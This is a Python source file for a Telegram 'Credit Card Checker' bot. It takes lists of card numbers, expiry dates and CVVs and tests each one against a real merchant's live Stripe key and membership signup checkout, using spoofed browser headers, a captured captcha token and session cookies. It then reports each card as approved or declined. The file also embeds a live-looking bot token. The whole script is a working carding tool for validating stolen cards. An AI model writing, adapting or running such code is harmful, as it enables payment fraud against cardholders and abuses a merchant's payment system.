import requests
import time
import threading
import random
import re
import telebot

# Bot token
BOT_TOKEN = "7634693376:AAGzz0nE7BfOR2XE7gyWGB6s4ycAL8pOUqY"

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Store user states and data
user_data = {}

# Regular expression for parsing credit card input
CARD_PATTERN = re.compile(r'(\d{13,16})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})')

# Helper function to generate a random email
def generate_random_email():
    name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
    return f"{name}@gmail.com"

# Function to perform the card check
def check_card(user_id, card_info):
    # Extract card details
    card_number, exp_month, exp_year, cvc = card_info
    
    # Prepare headers for Stripe API
    stripe_headers = {
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
    }

    # Prepare the payload for Stripe API
    payload_stripe = {
        'type': 'card',
        'billing_details[email]': user_data[user_id]['email'],
        'billing_details[name]': user_data[user_id]['name'],
        'card[number]': card_number,
        'card[cvc]': cvc,
        'card[exp_month]': exp_month,
        'card[exp_year]': exp_year,
        'guid': 'df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59',
        'muid': 'd3cfa58a-f8b2-4696-9334-dbed21e356d7c7b384',
        'sid': 'aca76358-1a35-4543-8c2f-195fde5ec839ece554',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/7f05e4e5d2; stripe-js-v3/7f05e4e5d2; card-element',
        'referrer': 'https://oecdpillars.com',
        'time_on_page': '57794',
        'key': 'pk_live_51M18g3DC6Pod4B2AHM1AGj8zHok5mHuXE94GT7i29soQ5u5otnKsjeSbj9C19SDW9ECoXnf1vhsX35FFwk2w4Ybv009L123y8v',
        '_stripe_version': '2019-10-08',
        'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiNHpSMmtxWU5VYjBRSit0czIya09qUEIwaDdhRTFXUlJ1ZjdtMGZDQjhjcFpSZFNySG1QWlc3SW41bzdvVXV2ME9SSXZjVWI5RmNjNmhjR2RHdkhhR3BSa3d2L3Yzd1Y1WTNrNWZMaGNUWGN6R2UzeVcxVnZUUUN6U0llWVV3dWVLdU1JMkk2OUNTcHRHMFk0RHNJYVJlQnRPOVVXTjdkbWd1eU93azd3R2RldWhXUStKNUFKdjI3Z3lpMStnZWJXbm0zbG0wTnpmL1Arb3Z2dDFDdG5rajU3K2ltREhUWXBBei9iSzZaS0tSR2hPZzBSNncvQi8xdXJ2eVFuN1pVc1I0Znk4QTJJNmZ2N3Y0by9Tck9XS21SaysxMWFkMjlIemtib0dtckwxT0VZT0prR2VrK2RMeGVRWkJjanU0V2RsWlRxQkd2VDdyWVlRRnNOMlJUUUJGcXVNM2ZlaHdJcjZFVG1vT2d1VHRVZEFWMUFvVDZwVlY4ZFgwSDJPd0pTcnA5MG1CZ2szUjQrNmRrV01Nak9zRWloeDhkcHA3SytVRFhMQ3Y5a3ZGTklGTEJGTE9OM29seTJ4bm81UDBKeTFtUDA5SnExcUxoQ3pWTUNjZFRSaFdoRVZ0dlJOdUhCNGxLdlpza3dhRlVnKzROZWpNaUtKdnp4R3pvQ1FYM1VFRWhBZDhBMUVLYThFQ3lrTEZvQXMwUzVQRFFXWVFRcEpjWnRoVi9Sd2ZBUzdxUy9qSlVLY3RSK3lkamx1bTZCRGlLMDBJK0ZDT2pLWXlEU0tHdFprZlFQRktZMWZqeEgwTTJuV1lEbGw1SmpLRXplUWY2NTFWeWlma0YrTkllTUcraTNhVFlRUEpHMXFsMEVaUHlWUWZmSmY2RkFwOGJRc2ZxUFlFSk1VRzIwbXNrNmNEVDFiTFQ4bUNLbEN3SldTUFA5MnZnVUhubzcxcWh1N0Z1RklENjRDNVRGMzhMLzlTY3ovaXlQQXdRWTRESzMwTitZS3c2RWUvMGp4WmJHb0EvTlV0Y0ltalcrak5OMmZuSHA0TXY2aisySnR1TnUvMTZMYU4rTDhsb0R1RVNtQ25SNXp2VnFzRW9oLzE5REYvV05vbGFOVUgzUndialZsTjdxcE9maEZpei9NdG9rY25wb21xK0JYUEdEUHY1aFFPTU5MeU5UenRrMlNCZmF4d1RsL294K1JkU3NBZ3ZWQWNDRG9Ic0RZcVdyYkJ6R1dGSG4wR2o0RVhrREo2dkhheUxoYkVtQ0ZqWDRNV1M4SFp0cFUrVk9lWGVXdTJ6SlptbkhXQXI4SnJLUmI5aCtkbzlUV3VSL2JCQ2FVY2NNUlRVcTNYV01pSGRoeDkzb0xibFJ4dTFLMlcxN1JHSkdYdjFxWkRBRllnK24vT3N0cHU5R1MzNEExSmJYQWRPb3BPbXRIcE93ejlEWnVBV1UrdXAwV0ZoRU54SHVwc0k3andOeHVjQ29qUGhud2pPRXhRVFpSMXdOZ3czN2U0cis1c3VOUFZVc3JSQ3kydHREeWtzcDBhZmtxeGNFYnQ5aVd2djA1aFYwbDlLOXE2MGEraEF6Y29GVjVhekREYTlkY0VkZUdYa2tOVnN4cE8xamFtQjNISkVQNFBhdXlaTEJ2bWtLNUcwVittOEk5Ung4aGEzVWNmZHFXanhQd3FoT3dRenVjMlo0aVFnUXdKSU5KeEE1TjBQVEJYdGhqL29YaFJWdWtYalR2NGdqN21uU2MwcDMwNm0yLzlZQytQNTBoUmxBbDN5a0V0UXQ4TGlzRHk1SUI2OTI5amxvcWVWTGNxRE1pY2pROXFwNlBubG45SUZLbnpCemYrc09MK2VhRVVFdVhPMWtNeWJWY2pNdG1VL3F6MDBhRTdpWU55UTJsN3ZCbTBRS2JFMWV4YzdaMWtFRGs3Nyt0ZTRiTHV4TGVBNldlcTIyUVFVbEhLT1krbFhjTVhvMXpVMDFYcjNKUTlUNTNRTmU4VzZraEc4MGUxZnJkMUNwcnJvcGFwVHFCWEV1eWdleXhhUE5FRVZyQ2pZaXFsLzFVQytPZGFDL0NtZFM0OXlQRkN6RDA3K2c3TDBHYzE1WXNyclRsYlZUYmJHQ2s1N1lGNlRVeERWd3NzOHB2c1locS9iOGdrRHhyS3VQWU0zcEQ4Sm5FM1Q5dVdtaHc5clhULzJ2ZXR3bGlKRmJXN1FhMnRocjFnbkIreVk4UEhhelZidVdFWjNnK0VsdlVzZGdjZlgwUk9sNzY4KzdUVy9IWnpQL1NPWmNsNGI2dzlvRmVnWlphZDBXUjZ4bk5UdngwZkI0Q3JWZ1dadENpbGFuajlmbHAyTnkyRHdWUDQ2R2RsYlo1dTUxUXFseXpSWmxyTG0yR1dWM3MzSzh6cU9jazZadjhPOFcrYkJ2Vmh6VWp0dU5Rai9ZMEFQa1NjNVgrRTEwbmp2QytPbmVPdnRBL1I4U1ZTRC9oWitqRmVKNERmSTFCcnB1Y1FadVRqQ3d2V0puMXJwOWF1RllSbkJ1UDNZTTVoSXRZNTFqVmdOTUNnMHlRRGZ0K0k1dnV1QnlmK0YrN2lOaUZjbGxJeUV5UThqVmhXSGFlcStMaldOYklKSHd4SmtoTFZOWWtwWXFuM01oWVVsQmdhSDRnemV0SFVqekk2cUZzMVA1K2FJQkhXNmdLMFFiYVMxK2c5UjQ2eldvQlQ3ZkEweGt4RG1pZnZJV3JDczV3TjVVWEZuNUxhRGlDVGx2S0RCb2ZiVU5ORXNqOWtRY3lLOG1KREhEc3VoZ2w4VXlTNkFvSzMzckRrOFJYeGdNTUl5bW5FaUxCZ2MxU0hIOUo1QVJ2a04xOUxTZUFXNHF3TGZXVGZvd0E3SDFrSDlkSEt0Um5NMXNjelEvd0tQanRqUFFyTWdrIiwiZXhwIjoxNzQ3MjE2Mjk2LCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMzUxMjZkZGQiLCJwZCI6MCwiY2RhdGEiOiI5bm11cVNqcVA4Q0RZSThPbkdHek1ZSldhTG1xVURvTDNUZDZsaHRaY1lxM0JaeTdmdlRQVk9EVDkySC9FTE9mNTduZlE2N2Rsb21zNjhXMnA0TVMrRUtBRnphT0I5M20zYTAzMWw0cjNKM3ZxSFVxYkI5YlRLL2VwYUxkN3kyd28yS3pwdE92LzZwL0J5UDBCSUExdE5vVGZxTThwbGJSNmhCMWlsaWdnbUZ5ZXhMaTdYc2VtOUFuVkJ0cTNuNzdLdkg5WmxMbXF5aE5KVGdqIn0.Nna-5APgTA1yU9G8a_8SZJBw-ohhFyy4BcvcpkrBVeA'
    }
    
    # Send request to Stripe API
    try:
        stripe_response = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=stripe_headers,
            data=payload_stripe
        )
        stripe_response.raise_for_status()
    except Exception as e:
        return f"Error connecting to Stripe API: {str(e)}"
    
    # Extract pm_id from response
    try:
        pm_response_json = stripe_response.json()
        pm_id = pm_response_json.get('id')
        if not pm_id:
            return "Error: Failed to retrieve payment method ID from Stripe response."
    except Exception as e:
        return f"Error parsing Stripe response: {str(e)}"
    
    # Prepare headers for final API
    final_headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-functional=no; cookielawinfo-checkbox-performance=no; cookielawinfo-checkbox-analytics=no; cookielawinfo-checkbox-advertisement=no; cookielawinfo-checkbox-others=no; _ga=GA1.1.499807244.1747216161; sib_cuid=c8ead458-1c27-409a-86c5-6eead31164f6; _omappvp=0UwjOA49ZR7Lwhr9Z2UPepAXqSSjmJkrenWQxmFgoBIKzPvqhtjTwcFzmDDMKUTH41y7nk0B0N6FRS420jxiNMqzVCaTDOE9; __stripe_mid=d3cfa58a-f8b2-4696-9334-dbed21e356d7c7b384; __stripe_sid=aca76358-1a35-4543-8c2f-195fde5ec839ece554; _ga_CZRJXBP9M4=GS2.1.s1747216161$o1$g1$t1747216174$j0$l0$h0; _omappvs=1747216174279',
        'origin': 'https://oecdpillars.com',
        'priority': 'u=0, i',
        'referer': 'https://oecdpillars.com/signup-form3/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
    }
    
    # Prepare payload for final API
    final_payload = {
        's2member_pro_stripe_checkout[coupon]': '',
        's2member_pro_stripe_checkout[first_name]': user_data[user_id]['name'].split()[0],
        's2member_pro_stripe_checkout[last_name]': user_data[user_id]['name'].split()[-1],
        's2member_pro_stripe_checkout[email]': user_data[user_id]['email'],
        's2member_pro_stripe_checkout[username]': user_data[user_id]['email'].split('@')[0],
        's2member_pro_stripe_checkout[password1]': 'War112233$%',
        's2member_pro_stripe_checkout[password2]': 'War112233$%',
        'stripe_pm_id': pm_id,
        'stripe_pi_id': '',
        'stripe_seti_id': '',
        'stripe_sub_id': '',
        'stripe_pi_secret': '',
        'stripe_seti_secret': '',
        's2member_pro_stripe_checkout[street]': '',
        's2member_pro_stripe_checkout[city]': '',
        's2member_pro_stripe_checkout[state]': '',
        's2member_pro_stripe_checkout[zip]': '',
        's2member_pro_stripe_checkout[country]': 'IQ',
        's2member_pro_stripe_checkout[nonce]': '0da1432faf',
        's2member_pro_stripe_checkout[attr]': 'ZGVmNTAyMDA3MmVmNzZhYjA0YmIzNWQ3YjZlMmYzZmRhMTNiMjM4YTc5Mjk2M2FhYmM1NTA4YTNjOWM3NWU3NTk0OGNiNTczN2Y3NDM5MGVhMWU4Yzc5ZGZkMTA5M2Q0YzMyZmIyMTczZWU2MmM0NDk0YWEwYzAwMDIxMzA3NjhiZjhjMTdlZDc4ZDBmOGM3NGJjYTM1OGZjNjdiZWRjNWY2Y2RiODU1YTQyYmU0MGJlMTk2ZjJlMTc0ODA2NTNkOGFlODA3Y2ZjODVmOWQwMTYxZmEwYWZjNTIxNDA5Yzc0YTY3NjkwZTM4MDljMGMzMzkzODQ0YjA1MzIzODNmMWQwNDdlNTlhYWJjZmZmZjg2YWJhODQ4NGYyYTJhOTQ1YzY3Y2I1N2E3MGFhYjMzMzBkNDhiMDhkOGEwZTFkMzIzMmU3MzUxNDc1M2Q1ZjY5YWVkZmYzMDMxNzU3YmNkYTQzZjEwMDFlZDM1MzJmZDMyMGJmZDgzMTZhMTJkYzZiNDNjY2Y4OThiNTkwZTE3YTI2Mzk3NzkzMWY1NDRlZjI2NjI2Yjg1MTBlYTI4YmY1MzJiYzVlOTA4M2NiNDU2NGRmYzg0NDJjYzBjYWY2NzY0NTcwN2NkODNiMDI3NGE1ZmRkMzM3NmFmOGUyMmUwZDFlY2QwYmVkZTIyMDJlODFiYmNkYWMyMTZkNmU3NDQ3MzkwZTgwOTM5MTFiMGVlNWYzZGZmNzRkMDhiMWRmNTU0Y2VjNTUyMDhmZTE2ODAwYWU3Yjk4M2MyMzc5ZjQ5Y2ZkZjRhNjU1MDVmNGIyZmFlODY0M2Y5MWZlYmEzOGUxMmZmY2VlODNlNmE4MjA3ZTcwZmMzMjY2M2JiYzlkZWZjMmU2NjQzZDI0MzhiOWNkODI2Yzg3YTFiMjBkZmU1YzdmYjA1YjEzMWE0MzNlNGVkMzg3MDdiY2QwOTFjODgyN2FmMDE1NzU2OGJjMWYxOTMyMjA2NjAwZDlmYTcxNjAxOTM5MmQzODRlOWJjNGUxYWI5ZjI0ZGYzMWRmNjdhZmM4ZWNlYTQ3ZTZmMTk0ODdiYWY0NDE2YmRlOTFjZmEyZjc5NTQ5MTY0MGI5ZDkwZDI0NjY2OTRjMGYxN2QyN2Q4M2JlN2RmMGFhZDE3NjJmZDA0NjQ0YzFlN2ExYjMyOTgxMjkzNTM4OTM2NmU3ODBhN2UyZGU1OGJlNjg3OWNhMjNiNzJlN2QyYzdkZTBlZDI1YzQ2NjJkM2I0MWM1YzM0YzI0ZmE4MGFlNmIxYmQ4ZDE0ZDdmZDNiMTQ5OTFjM2M1NTA4NThlYWY4MDczYzU1NDc2YmU0ZmNkNDg4YmRiMTZmNDFlOWMyNjZkNjc4OGM5MzdlMmNhMWM0ZTg3ZTBjZWU3OTMzN2QxNjc4ZjEzYzc5ZjJkZmNmMjZiNzJlZjk0N2FjYzdjZDlhNDc0YjI4YjQ1NTExZWUzNzg1N2ExZDcwNjI3OTM2ZGU1MTQyNmI5ZDhiZTEzNzc1YWFlZDg0ZjNlNTM3NWIyMmI1MzViMDRhNDdhMDE0N2I4MjVjNzAwNGIyMDdkZTQzZTRiNDdhODBiOGRiOWI1ODhhMDg2NjFhOWIwNjZlY2U3OWFlMWM3ZmE0ZmQ0Y2ZiN2M5ZjI2NTBjNzM3Zjk3MzI1YzAyZWYzNzA3OTQ1NTczZjc2M2JhZjY4OWQ5NTEyYjlhOGM5ZTE4ZGNkMzZjZDdjZjk4ZWZmZjVkMjA2YzM5YWQ3MTRkNzExN2YyYjZmYmI3NTdjYmJkZTNiM2NlODhkYWY4OGJhYzVjY2M3YjdhMTllODNiNDkxNDNkYzg1ZDkwNzBkNzEwZTY0OWE3OTVlNmZmNTNmZmNiY2QxMDk4NGJjYTdjM2IwZTgyZDgxMWU2NzcxZWQzNmZiMTU0OWU4YjIyYWVjY2JmYjkzMWYxMWU0MzY4ZTM0NmU4NjMyMmI1YjIzMTkzNzY0NmE2N2M1MjZkOGVhMjlhOTVhNTMwYTdhMTg2OWRjNWZhZDcxNzMyNmJmZmM2NGMxYjk2OTMyNTJhZTAyYTMzYTAyMzRhYzkxOThlZDc2NWIwZWFjZmJjYTgwYTUyZTllZTkxMmQ3NmQ1YzE1YzhhOWRjYzE1YWU5NDlkMWJkNjgzOGYxYTg2YmE1ODhkZGNmZjRmNTU2Zjg5YmEwY2JkNjJiNDQ3YmY4YTNiODg2OGJmNGNiMTJiOGQ5MzQwMWE4NTgwOTNhMjhjMzc0YWIyNjVlMjY1ZDNiZmQ3MjQ3ZjRiOGRlZDQ0Y2EyMjZhMjZmMGFhZmZlNTIwMDc0YmJiMmVhNDI0NTc0MWYxMzY0NTdjN2E3ZThlMDRhNjY2NzJmZWU2NzE4Nw'
    }
    
    # Send request to final API
    try:
        final_response = requests.post(
            "https://oecdpillars.com/signup-form3/",
            headers=final_headers,
            data=final_payload
        )
        final_response.raise_for_status()
    except Exception as e:
        return f"Error connecting to final API: {str(e)}"
    
    # Check response for success or decline
    response_text = final_response.text
    if "Your card was declined." in response_text:
        return f"❌ DECLINED ❌\n\nResponse:\n{response_text}"
    else:
        return f"✅ APPROVED ✅\n\nResponse:\n{response_text}"

# Threaded function to process multiple cards with delay
def process_cards(user_id, cards):
    for card in cards:
        if user_data[user_id]['stopped']:
            break
        
        # Send checking message
        bot.send_message(user_id, f"🔍 Checking card: {card[0][:6]}••••••{card[0][-4:]}")
        
        # Process the card
        result = check_card(user_id, card)
        bot.send_message(user_id, result)
        
        # Delay between checks if not the last card
        if card != cards[-1] and not user_data[user_id]['stopped']:
            time.sleep(15)
    
    # Send completion message
    if not user_data[user_id]['stopped']:
        bot.send_message(user_id, "✅ All cards processed!")

# Start command handler
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.chat.id
    user_data[user_id] = {
        'state': 'waiting_for_cards',
        'cards': [],
        'stopped': False,
        'name': 'John Doe',  # Default name
        'email': generate_random_email(),  # Random email
        'pm_id': None
    }
    bot.send_message(user_id, "💳 Welcome to the Credit Card Checker Bot!\n\n"
                             "Please send your credit cards in one of these formats:\n"
                             "• CC|MM|YY|CVV\n"
                             "• CC|MM|YYYY|CVV\n"
                             "• CC/MM/YY/CVV\n"
                             "• CC/MM/YYYY/CVV\n\n"
                             "You can send multiple cards separated by new lines.\n\n"
                             "Use /stop to cancel checking at any time.")

# Stop command handler
@bot.message_handler(commands=['stop'])
def handle_stop(message):
    user_id = message.chat.id
    if user_id in user_data:
        user_data[user_id]['stopped'] = True
        bot.send_message(user_id, "🛑 Checking process stopped.")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.chat.id
    if user_id not in user_data or user_data[user_id]['state'] != 'waiting_for_cards':
        return
    
    text = message.text.strip()
    lines = text.split('\n')
    cards = []

    for line in lines:
        line = line.strip()
        match = CARD_PATTERN.match(line)
        if match:
            card_number = match.group(1).replace(' ', '').replace('-', '')
            exp_month = match.group(2).zfill(2)
            exp_year = match.group(3)
            if len(exp_year) == 2:
                exp_year = '20' + exp_year
            cvc = match.group(4)
            cards.append((card_number, exp_month, exp_year, cvc))
        else:
            # Try to parse other formats manually
            parts = re.split(r'[|/]', line)
            if len(parts) == 4:
                card_number = parts[0].replace(' ', '').replace('-', '')
                exp_month = parts[1].zfill(2)
                exp_year = parts[2]
                if len(exp_year) == 2:
                    exp_year = '20' + exp_year
                cvc = parts[3]
                cards.append((card_number, exp_month, exp_year, cvc))
            else:
                continue  # Skip lines that don't match expected formats

    if not cards:
        bot.send_message(user_id, "❌ No valid credit card entries found. Please check the format and try again.")
        return

    # Save user data
    user_data[user_id]['cards'] = cards
    user_data[user_id]['stopped'] = False

    bot.send_message(user_id, f"🔎 Found {len(cards)} valid card(s). Starting checks with 15 second delay between each...")

    # Run the checks in a separate thread to avoid blocking
    threading.Thread(target=process_cards, args=(user_id, cards)).start()

# Start the bot
if __name__ == '__main__':
    print("Bot is running...")
    bot.polling()
